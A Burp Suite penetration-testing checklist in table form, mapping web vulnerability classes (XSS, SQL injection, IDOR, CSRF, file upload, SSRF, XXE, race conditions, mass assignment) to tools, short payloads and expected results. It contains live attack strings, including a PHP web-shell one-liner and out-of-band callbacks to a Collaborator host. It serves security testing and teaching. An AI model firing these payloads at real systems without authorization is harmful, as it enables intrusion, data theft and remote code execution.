# Burp-focused SANS/CWE Checklist

| Vulnerability | One-line definition | Burp tool approach | Payload (short) | Where to test (general) | Expected result |
|---|---:|---|---|---|---|
| DOM-based XSS | Client-side script injection via DOM sinks | Proxy + DOM Invader / Repeater | `location.hash="<script>alert(1)</script>"` | JS-driven pages, hash/fragment handlers, client-side templates | Script executes in browser context |
| Stored XSS | Persisted input rendered to other users | Proxy + Repeater/Intruder; trigger via Collaborator if OOB | `<img src=x onerror=alert(1)>` | Comment fields, message boards, profile bio inputs | Payload executes when another user views content |
| Reflected XSS | Immediate script injection reflected in response | Scanner + Repeater manual verification | `"><script>alert(1)</script>` | Query params, search, error pages | Script executes in victim’s browser |
| Blind / Time-based SQLi | SQL injection detectable by timing differences | Repeater/Intruder or sqlmap via Burp | `' OR IF(1=1,SLEEP(5),0)-- -` | ID/query params, filters, item endpoints | Delayed response indicates injection |
| Authentication bypass / IDOR | Accessing others’ data by tampering IDs/credentials | Repeater + Autorize; JWT/param tampering | `user_id=124` (changed) or modify JWT `sub` | Object endpoints, user profile APIs | Access to another user’s data or actions |
| Business logic flaw | Application workflow abused to break rules | Proxy + Repeater/Intruder scripted multi-step | change `price` or `quantity` between steps | Checkout, promo, refund, workflow endpoints | Bypass rules (free item, duplicate credit) |
| CSRF (state change) | State-changing action without proper CSRF protection | Repeater + manual CSRF PoC form | `<form action="/transfer" method="POST">...</form>` | State-changing POST endpoints (transfer, settings) | Action succeeds without valid anti-CSRF token |
| File upload bypass / RCE | Upload allowed files executed on server | Repeater/Intruder; tamper Content-Type/extension | `shell.php.jpg` with ``<?php system($_GET['c']); ?>`` | File upload endpoints (avatars, docs) | Uploaded file executes or accessible as code |
| Deserialization (untrusted) | Unsafe deserialization leads to code/object control | Repeater + custom gadget payloads + Collaborator | Java serialized gadget or modified JSON | APIs accepting serialized objects or object fields | RCE or arbitrary object manipulation |
| SSRF / OOB request | Server-side request to attacker-controlled host | Repeater + Burp Collaborator | `url=http://<collab-id>.burpcollab.net` | URL fetch, preview, webhook endpoints | Server performs OOB callback to Collaborator |
| XXE (XML External Entity) | XML parser fetching external entities | Repeater + crafted XML + Collaborator | `<!DOCTYPE x [<!ENTITY e SYSTEM "http://<collab>">]>` | XML upload/parse endpoints, SOAP APIs | External request or file contents exfiltrated |
| Race condition / concurrency | Timing-based state corruption under concurrent requests | Turbo Intruder or scripted concurrent requests | send two `POST /checkout` at same time | Checkout/payment/transfer endpoints | Double-spend or inconsistent state observed |
| Rate limiting / brute-force | Missing throttling allows enumeration/bruteforce | Turbo Intruder/Intruder with rate patterns | mass username/password attempts | Login, password-reset, auth endpoints | No lockout; credentials enumerated/bruteforced |
| Session issues (fixation/entropy) | Weak/reusable session tokens or fixation | Sequencer + Repeater (reuse/expiry tests) | reuse old session ID or predictable token | Auth flows, session cookies, token endpoints | Token predictable/reusable; session persists after logout |
| API mass-assignment | Unfiltered parameter binding alters sensitive fields | Proxy + Param Miner + Intruder; tamper JSON body | add `"isAdmin": true` in JSON | API endpoints accepting JSON object updates | Sensitive attribute changed; privilege escalation |
| Verbose error disclosure | Internal details leaked via error responses | Repeater: send malformed inputs and inspect | send malformed JSON / invalid ID | Any endpoint that throws 4xx/5xx errors | Stack trace, internal paths, or sensitive info in response |
| Hidden endpoints discovery | Undocumented endpoints exposed in app resources | Proxy + Spider + Kiterunner / inspect JS | crawl `.js` for `/api/private/*` | Service workers, JS files, mobile app traffic | Hidden endpoints discovered that accept sensitive actions |
